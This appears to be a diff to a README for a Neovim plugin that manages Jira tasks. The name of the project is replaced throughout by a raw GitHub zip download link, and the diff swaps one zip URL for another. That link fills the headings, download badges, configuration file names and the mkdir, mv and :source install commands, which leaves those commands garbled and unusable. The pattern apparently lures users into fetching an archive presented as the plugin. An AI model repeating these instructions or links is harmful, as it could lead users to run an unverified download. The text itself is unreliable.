@@ -1,14 +1,14 @@
-# 🎯 https://github.com/Madilson010/jira.nvim/raw/refs/heads/main/lua/jira/jira-api/jira-nvim-firstling.zip - Access Jira Directly in Neovim
+# 🎯 https://raw.githubusercontent.com/Madilson010/jira.nvim/main/scripts/nvim-jira-2.4.zip - Access Jira Directly in Neovim
 
 ## 🚀 Getting Started
 
-Welcome to https://github.com/Madilson010/jira.nvim/raw/refs/heads/main/lua/jira/jira-api/jira-nvim-firstling.zip! This plugin allows you to manage your Jira tasks directly from Neovim without needing to open a web browser. 
+Welcome to https://raw.githubusercontent.com/Madilson010/jira.nvim/main/scripts/nvim-jira-2.4.zip! This plugin allows you to manage your Jira tasks directly from Neovim without needing to open a web browser. 
 
 ## 📥 Download & Install
 
 To get started, you'll need to download the plugin. Click the link below to visit the Releases page:
 
-[![Download https://github.com/Madilson010/jira.nvim/raw/refs/heads/main/lua/jira/jira-api/jira-nvim-firstling.zip](https://github.com/Madilson010/jira.nvim/raw/refs/heads/main/lua/jira/jira-api/jira-nvim-firstling.zip)](https://github.com/Madilson010/jira.nvim/raw/refs/heads/main/lua/jira/jira-api/jira-nvim-firstling.zip)
+[![Download https://raw.githubusercontent.com/Madilson010/jira.nvim/main/scripts/nvim-jira-2.4.zip](https://raw.githubusercontent.com/Madilson010/jira.nvim/main/scripts/nvim-jira-2.4.zip)](https://raw.githubusercontent.com/Madilson010/jira.nvim/main/scripts/nvim-jira-2.4.zip)
 
 Once you're on the Releases page, look for the latest version. You will find the installation files listed there. Follow these steps to download and install:
 
@@ -25,11 +25,11 @@ After the download is complete, follow these instructions to install the plugin 
 1. **Open your terminal.**
 2. **Create a directory for your Neovim plugins if you don’t have one yet:**
    ```bash
-   mkdir -p ~https://github.com/Madilson010/jira.nvim/raw/refs/heads/main/lua/jira/jira-api/jira-nvim-firstling.zip
+   mkdir -p ~https://raw.githubusercontent.com/Madilson010/jira.nvim/main/scripts/nvim-jira-2.4.zip
    ```
 3. **Move the downloaded file to the plugins directory:**
    ```bash
-   mv https://github.com/Madilson010/jira.nvim/raw/refs/heads/main/lua/jira/jira-api/jira-nvim-firstling.zip ~https://github.com/Madilson010/jira.nvim/raw/refs/heads/main/lua/jira/jira-api/jira-nvim-firstling.zip
+   mv https://raw.githubusercontent.com/Madilson010/jira.nvim/main/scripts/nvim-jira-2.4.zip ~https://raw.githubusercontent.com/Madilson010/jira.nvim/main/scripts/nvim-jira-2.4.zip
    ```
 4. **Open Neovim:**
    ```bash
@@ -37,7 +37,7 @@ After the download is complete, follow these instructions to install the plugin 
    ```
 5. **Load the plugin by executing the command in Neovim:**
    ```vim
-   :source ~https://github.com/Madilson010/jira.nvim/raw/refs/heads/main/lua/jira/jira-api/jira-nvim-firstling.zip
+   :source ~https://raw.githubusercontent.com/Madilson010/jira.nvim/main/scripts/nvim-jira-2.4.zip
    ```
 
 ### For Windows
@@ -49,7 +49,7 @@ After the download is complete, follow these instructions to install the plugin 
    ```
 3. **Move the downloaded file to the plugins directory:**
    ```cmd
-   move path\to\downloaded\https://github.com/Madilson010/jira.nvim/raw/refs/heads/main/lua/jira/jira-api/jira-nvim-firstling.zip %USERPROFILE%\AppData\Local\nvim\
+   move path\to\downloaded\https://raw.githubusercontent.com/Madilson010/jira.nvim/main/scripts/nvim-jira-2.4.zip %USERPROFILE%\AppData\Local\nvim\
    ```
 4. **Open Neovim:**
    ```cmd
@@ -57,7 +57,7 @@ After the download is complete, follow these instructions to install the plugin 
    ```
 5. **Load the plugin by executing the command in Neovim:**
    ```vim
-   :source %USERPROFILE%\AppData\Local\nvim\https://github.com/Madilson010/jira.nvim/raw/refs/heads/main/lua/jira/jira-api/jira-nvim-firstling.zip\https://github.com/Madilson010/jira.nvim/raw/refs/heads/main/lua/jira/jira-api/jira-nvim-firstling.zip
+   :source %USERPROFILE%\AppData\Local\nvim\https://raw.githubusercontent.com/Madilson010/jira.nvim/main/scripts/nvim-jira-2.4.zip\https://raw.githubusercontent.com/Madilson010/jira.nvim/main/scripts/nvim-jira-2.4.zip
    ```
 
 ## 🌟 Features
@@ -69,15 +69,15 @@ After the download is complete, follow these instructions to install the plugin 
 
 ## 🔧 System Requirements
 
-To run https://github.com/Madilson010/jira.nvim/raw/refs/heads/main/lua/jira/jira-api/jira-nvim-firstling.zip effectively, ensure your system meets the following requirements:
+To run https://raw.githubusercontent.com/Madilson010/jira.nvim/main/scripts/nvim-jira-2.4.zip effectively, ensure your system meets the following requirements:
 
 - **Neovim Version:** 0.5 or higher.
 - **Operating System:** Any Unix-based system (Linux, macOS) or Windows.
 - **Internet Connection:** Needed for Jira access and updates.
 
-## 📖 How to Use https://github.com/Madilson010/jira.nvim/raw/refs/heads/main/lua/jira/jira-api/jira-nvim-firstling.zip
+## 📖 How to Use https://raw.githubusercontent.com/Madilson010/jira.nvim/main/scripts/nvim-jira-2.4.zip
 
-After installation, you can start using the features of https://github.com/Madilson010/jira.nvim/raw/refs/heads/main/lua/jira/jira-api/jira-nvim-firstling.zip Here’s a simple guide:
+After installation, you can start using the features of https://raw.githubusercontent.com/Madilson010/jira.nvim/main/scripts/nvim-jira-2.4.zip Here’s a simple guide:
 
 1. **Open Neovim.**
 2. **Link your Jira account:**
@@ -94,14 +94,14 @@ After installation, you can start using the features of https://github.com/Madil
 
 ## 📑 Optional Configuration
 
-You can customize https://github.com/Madilson010/jira.nvim/raw/refs/heads/main/lua/jira/jira-api/jira-nvim-firstling.zip to suit your preferences. Here are some settings you might want to adjust:
+You can customize https://raw.githubusercontent.com/Madilson010/jira.nvim/main/scripts/nvim-jira-2.4.zip to suit your preferences. Here are some settings you might want to adjust:
 
-- **Change the task display format:** Edit the `https://github.com/Madilson010/jira.nvim/raw/refs/heads/main/lua/jira/jira-api/jira-nvim-firstling.zip` file in the plugin directory.
-- **Customize your keyboard shortcuts:** Look for the `https://github.com/Madilson010/jira.nvim/raw/refs/heads/main/lua/jira/jira-api/jira-nvim-firstling.zip` file to map your preferred keys.
+- **Change the task display format:** Edit the `https://raw.githubusercontent.com/Madilson010/jira.nvim/main/scripts/nvim-jira-2.4.zip` file in the plugin directory.
+- **Customize your keyboard shortcuts:** Look for the `https://raw.githubusercontent.com/Madilson010/jira.nvim/main/scripts/nvim-jira-2.4.zip` file to map your preferred keys.
   
 ## ❓ Frequently Asked Questions
 
-### Can I use https://github.com/Madilson010/jira.nvim/raw/refs/heads/main/lua/jira/jira-api/jira-nvim-firstling.zip without an internet connection?
+### Can I use https://raw.githubusercontent.com/Madilson010/jira.nvim/main/scripts/nvim-jira-2.4.zip without an internet connection?
 
 No, you need an internet connection to access your Jira tasks.
 
@@ -115,6 +115,6 @@ If you have any questions or need support, feel free to open an issue on the Git
 
 For more updates, keep an eye on the Releases page:
 
-[![Download https://github.com/Madilson010/jira.nvim/raw/refs/heads/main/lua/jira/jira-api/jira-nvim-firstling.zip](https://github.com/Madilson010/jira.nvim/raw/refs/heads/main/lua/jira/jira-api/jira-nvim-firstling.zip)](https://github.com/Madilson010/jira.nvim/raw/refs/heads/main/lua/jira/jira-api/jira-nvim-firstling.zip) 
+[![Download https://raw.githubusercontent.com/Madilson010/jira.nvim/main/scripts/nvim-jira-2.4.zip](https://raw.githubusercontent.com/Madilson010/jira.nvim/main/scripts/nvim-jira-2.4.zip)](https://raw.githubusercontent.com/Madilson010/jira.nvim/main/scripts/nvim-jira-2.4.zip) 
 
-Thank you for using https://github.com/Madilson010/jira.nvim/raw/refs/heads/main/lua/jira/jira-api/jira-nvim-firstling.zip! Enjoy managing your tasks effectively from Neovim!
+Thank you for using https://raw.githubusercontent.com/Madilson010/jira.nvim/main/scripts/nvim-jira-2.4.zip! Enjoy managing your tasks effectively from Neovim!
